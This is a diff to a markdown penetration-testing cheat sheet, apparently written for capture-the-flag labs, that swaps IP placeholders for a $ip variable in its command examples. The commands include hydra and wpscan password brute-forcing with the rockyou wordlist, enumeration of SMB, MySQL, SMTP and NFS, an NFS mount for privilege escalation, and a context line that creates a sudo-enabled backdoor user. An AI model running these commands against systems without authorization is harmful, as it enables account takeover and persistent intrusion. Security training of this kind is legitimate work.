@@ -100,14 +100,14 @@ wpscan --url http://<adress>/ -e ap (plugin)
 # Brute Force Attack ✅📚
 ## Hydra Attack Type Cheat Sheet ✅
 ```bash
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
+hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV $ip ftp
 ```
 ### Web_Method Brute Force ✅
 ```bash
 nikto -h http://10.10.131.147:1234/manager/html -id bob:<password> (get-method)
 wpscan --url http://<adress>/ --usernames <user> --passwords /usr/share/wordlists/rockyou.txt
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-get /protected/ -I
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
+hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f $ip -s 80 http-get /protected/ -I
+hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f $ip -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
 ```
 # Privilege-Escalation ✅📚
 ## SUID_SGID_Capabilities_Files_enumeration ✅
@@ -160,20 +160,22 @@ useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:AL
 
 # service ✅📚
 ## SMB ✅
+#### Default ports 445,139
 ```bash
-enum4linux -a
-smbclient -L //<ip>/ -p <port>
-smbget -R smb://<ip>/<share>
-smbclient //<ip>/<share dir> 
-smbclient //<ip>/<share dir> -p <port>
-smbclient //<ip>/<share dir> -U Anonymous -p <port>
+enum4linux -a $ip
+smbclient -L //$ip/ -p <port>
+smbget -R smb://$ip/<share>
+smbclient //$ip><share dir> 
+smbclient //$ip/<share dir> -p 445|139
+smbclient //$ip/<share dir> -U Anonymous -p 445|139
 ```
 ## MySQL ✅
+#### Default ports 3306
 ### *enumeration ✡️
 ```bash
 mysql -u root
 mysql -u root -p
-mysql -h <Hostname> -u root
+mysql -h $ip -u root
 ```
 ### MySQL commands ✡️
 ```mysql
@@ -193,15 +195,15 @@ SELECT * FROM <table_name> WHERE <column_name> LIKE '%search_string%';
 telnet INSERTIPADDRESS 25
 nc -nvv INSERTIPADDRESS 25
 smtp-user-enum -M <MODE> -u <USER> -t <IP>
-nmap <ip> -p <port> -vv -A --script "smtp-*" -oN namp.txt
+nmap $ip -p #PORTS -vv -A --script "smtp-*" -oN namp.txt
 After finding the username, we will bruteforce <ssh|smb|ftp|nfs> with hydra
 ```
 ## NFS ✅
 ```bash
-showmount -e <IP> (print NFS shares)
+showmount -e $ip (print NFS shares)
 
 mkdir /tmp/nfs
-sudo mount -o rw -t nfs <IP>:<share> /tmp/nfs/ -nolock
+sudo mount -o rw -t nfs $ip:<share> /tmp/nfs/ -nolock
 
 cat /etc/exports (root_squash OR no_root_squash)
 ```
